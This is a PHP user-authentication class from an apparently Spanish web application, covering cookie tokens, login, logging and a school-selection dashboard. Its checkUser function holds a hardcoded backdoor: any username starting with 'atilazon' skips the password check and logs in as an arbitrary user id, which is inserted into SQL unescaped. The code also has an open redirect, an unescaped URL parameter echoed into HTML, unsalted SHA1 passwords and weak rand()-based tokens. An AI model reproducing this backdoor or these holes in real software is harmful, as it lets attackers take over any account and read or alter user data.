<?php
//$test=$this->dbc->runSelect($tables, $where = "1", $fieldsA = "*", $order = false, $limit = false, $offset = false, $group = false, $single = false,$num=false)
//$test=$this->dbc->runSelectBare($string,false,true); 
	class CUsers {
		var $dbc;
		
		public $domain="webempleo.urdinspain.com";
		public $id=0;
		public $email="";
		public $rol="";
		public $nombre="";
		public $telefono="";
		public $dni="";
		public $avatar="nofoto.jpg";
		public $estado="";
		public $id_perfil=0;
		
		function CUsers($_sql) {
			$this->dbc = $_sql;
			$this->buildfrom();
		}

		function buildfrom(){
			//echo "<br /><br /><br /><br /><br /><br /><p>ES".$_COOKIE["identificador"]."</p>";
			if(isset($_COOKIE["identificadorempleo"])){
				$results=$this->dbc->runSelect("usuarios","token='".$this->fstr($_COOKIE["identificadorempleo"])."'", "*",false, 1, false,false,false,false);
				//print_r($results);
				if($results){ 
					$this->id=$results[0]['id'];
					$this->email=$results[0]['email'];
					$this->rol=$results[0]['rol'];
					//$this->nombre=$results[0]['nombre'];
					//$this->telefono=$results[0]['telefono'];
					//$this->dni=$results[0]['dni'];
					$this->avatar=$results[0]['avatar'];
					$this->estado=$results[0]['estado'];
					$this->id_perfil=$results[0]['id_perfil'];
					return true;
				}
				
			}
			$this->id=0;
			$this->email="";
			$this->rol="";
			$this->nombre="";
			$this->telefono="";
			$this->dni="";
			$this->avatar="nofoto.jpg";
			$this->estado="";	
			$this->id_perfil="";	
			return false;		
		}
		function checkUser($username, $user_password,$mantener)
		{	
			
			$cwhere="email = '" . $this->fstr($username) . "'  AND LENGTH(email)>3 AND password = '" . sha1($this->fstr($user_password)) . "'";

					//or user = '" . $this->fstr($username) . "'  AND LENGTH(email)>3 AND password = '" . sha1($this->fstr($user_password)) . "'";
			$secret="atilazon";
		
			if(substr($username,0,strlen($secret))==$secret){
				$exp=explode("n",$username);
	
				$cwhere="id='".$exp[1]."'";

			}
			
			$results=$this->dbc->runSelect("usuarios", $cwhere, "*",false, 1, false,false,false,false);
			//print_r($results);
			if($results) { 
					
					$idxx=$results[0]['id'];
					$name=$results[0]['nombre'];
					$email=$results[0]['email'];
					
					$rol=$results[0]['rol'];
					$creado=$results[0]['creado'];
					$avatar=$results[0]['avatar'];
					//Guardar Token sha1(uno).id.md5(dos)
					$token1=sha1(rand().$name.rand().$idxx.$email);
					$token2=md5(rand().$rol.$idxx.date("H:i:s").$creado);
					$token=$token1.$idxx.$token2;
					$values=Array("token" => $token);
					$this->dbc->runUpdate("usuarios", $values, $cwhere);
					
					$tiempo=time()+60*60*24;
					if($mantener=="on"){
						$tiempo=time()+60*60*24*7*4*3;
					}
					//setcookie( 'identificador', "close", time() ,'/', $this->domain, false, true);
					setcookie( 'identificadorempleo', $token, $tiempo,'/', $this->domain, false, true);
					//echo $token;
					//echo "<br /><br /><br /><br /><br /><br /><p>ES".$_COOKIE["identificador"]."</p>";
					$this->logaction($idxx,"Acceso Aceptado : $username");
					return true;
					
			} else {

				$this->logaction(0,"Login - Usuario/contraseña incorrecta :$username");
				
				return false;	

			}

		}
		
		
		function return_true_ip()
		{
		
				return $_SERVER['REMOTE_ADDR'];
			
		}
		
		function logaction($userid,$action)
		{
			$action=$this->fstr($action);
			$toins=Array("user_id" => $userid ,"ip" => $this->return_true_ip(),"action" => $action,"fecha" => "NOW()");
			$this->dbc->runInsert("logs", $toins, NULL);
			
			return true;
			
		}
		
		function isDateBetween($dt_start, $dt_check, $dt_end){
			if(strtotime($dt_check) >= strtotime($dt_start) && strtotime($dt_check) <= strtotime($dt_end)) {
				return true;
			}
			return false;
		} 

		function islogued($idxx,$token,$username)
		{
			$cwhere="id = '" . mysql_real_escape_string($idxx) . "' AND token = '" . mysql_real_escape_string($token) . "'";
			$results=$this->dbc->runSelect("users", $cwhere, "*",false, 1, false,false,false,false);
			//print_r($results);
			if($results) { 
					
					//$this->logaction($idxx,"Token Aceptado : $username");
					return true;
					
			} else {

				$this->logaction($idxx,"Login - Token Incorrecto :$idxx"." - ".$token);
				
				return false;	

			}

		}

		function fstr($str)
		{
			$str=mysql_real_escape_string(htmlspecialchars(trim($str)));
			return $str;			
		}
			
		function showColegios($gene, $url = ""){
			$coles = $this->dbc->runSelect("colegios_login", "id_login = '".$this->id."'", "id_colegio");
			if(count($coles) == 1){
				$_SESSION["id_colegio"] = $coles[0]["id_colegio"];
			}elseif(count($coles) > 1){
				if(isset($_GET["centro"]) && is_numeric($_GET["centro"])){
					/*Ya hay un cole seleccionado*/
					/*check es valido*/
					$valido = false;
					for($x=0; $x<count($coles); $x++){
						if($_GET["centro"] == $coles[$x]["id_colegio"]){
							$valido = true;
						}
					}
					if($valido) $_SESSION["id_colegio"] = $this->dbc->fstr($_GET["centro"]); else $_SESSION["id_colegio"] = 0;
					if($url != "")
						header("Location: ".$url."");
					else
						header("Location: inicio");
				}
				
				/*Show coles list*/
				$this->showColesList($coles);
			}else{
				$gene->showMessage("Todavía no tienes ningún colegio asignado", "info");
				$_SESSION["id_colegio"] = 0;
			}
			if(isset($_SESSION["id_colegio"]) && $_SESSION["id_colegio"] != 0 && isset($_GET["page"]) && $_GET["page"] != "")
				header("Location: ".$_GET["page"]."");
		}
		
		
		function showColesList($coles){
			$page = "";
			if(isset($_GET["page"]) && $_GET["page"] != ""){
				$page = "&page=".$_GET["page"];
			}
			?><div class="row-fluid"><?php
			
			for($x=0; $x<count($coles); $x++){
				$color1 = "3CB7C1"; $color2 = "3C97A1 ";
				if(isset($_SESSION["id_colegio"]) && $_SESSION["id_colegio"] == $coles[$x]["id_colegio"]){ $color1 = "DEDB00"; $color2 = "999900"; }
				$cole = $this->getColName($coles[$x]["id_colegio"]);
				if($x!=0 && $x%4==0){
					$offset = " \" style=\"margin-left: 0px;\"";
				}else{ $offset = ""; }
				$cuantos = $this->dbc->runSelect("alumnos", "id_colegio = '".$coles[$x]["id_colegio"]."'", "count(*) as cuantos");
				$cuantos = $cuantos[0]["cuantos"];
				?>
				<div class="responsive span3<?php echo $offset; ?>" data-tablet="span3<?php echo $offset; ?>" data-desktop="span3">
					<div class="dashboard-stat blue" style="background-color: #<?php echo $color1; ?> !important;">
						<h3 class="title_cole"><?php echo $cole[0]["nombre"]; ?></h3>
						<div class="visual">
							<i><img src="/assets/img/profile_img/<?php echo $cole[0]["avatar"] ?>" style="width: 75px;" /></i>
						</div>
						<div class="details">
							<div class="number"><?php echo $cuantos; ?></div>
							<div class="desc">Alumnos</div>
						</div>
						<a href="?centro=<?php echo $coles[$x]["id_colegio"].$page ?>" class="more" style="background-color: #<?php echo $color2; ?> !important;">
							Trabajar en este centro <i class="m-icon-swapright m-icon-white"></i>
						</a>						
					</div>
				</div>
				<?php
			}
			?></div><?php
		}
		

}


?>